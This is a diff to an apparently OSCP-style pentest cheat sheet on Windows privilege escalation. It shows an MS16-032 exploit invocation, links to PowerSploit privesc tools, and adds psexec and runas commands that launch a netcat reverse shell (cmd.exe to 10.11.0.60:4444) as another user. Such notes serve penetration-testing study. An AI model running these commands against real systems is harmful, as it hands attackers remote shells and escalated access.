@@ -1455,16 +1455,22 @@ Handy exploits:
       `powershell -ExecutionPolicy ByPass -command "& { . C:\Users\Public\Invoke-MS16-032.ps1; Invoke-MS16-032 }"`
       
     
-    
 -   Powershell Priv Escalation Tools
     https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc
 
+-   Sysinternals psexec is a handy tool for running a command on a remote or local server as a specific user, given you have thier username and password. The following example creates a reverse shell from a windows server to our Kali box using netcat for Windows and Psexec (on a 64 bit system).
 
--   Runas.exe is a handy windows tool that allows you to run a program as another user so long as you know thier password:
+         C:\>psexec64 \\COMPUTERNAME -u Test -p test -h "c:\users\public\nc.exe -nc 10.11.0.60 4444 -e cmd.exe" 
 
-         C:\>C:\Windows\System32\runas.exe /env /noprofile /user:Test "calc.exe"
+         PsExec v2.2 - Execute processes remotely
+         Copyright (C) 2001-2016 Mark Russinovich
+         Sysinternals - www.sysinternals.com
+
+-   Runas.exe is a handy windows tool that allows you to run a program as another user so long as you know thier password. The following example creates a reverse shell from a windows server to our Kali box using netcat for Windows and Runas.exe:
+
+         C:\>C:\Windows\System32\runas.exe /env /noprofile /user:Test "c:\users\public\nc.exe -nc 10.11.0.60 4444 -e cmd.exe"
          Enter the password for Test:
-         Attempting to start calc.exe as user "COMPUTERNAME\Test" ...
+         Attempting to start nc.exe as user "COMPUTERNAME\Test" ...
       
 -   Windows Service Configuration Viewer - Check for misconfigurations
     in services that can lead to privilege escalation. You can replace
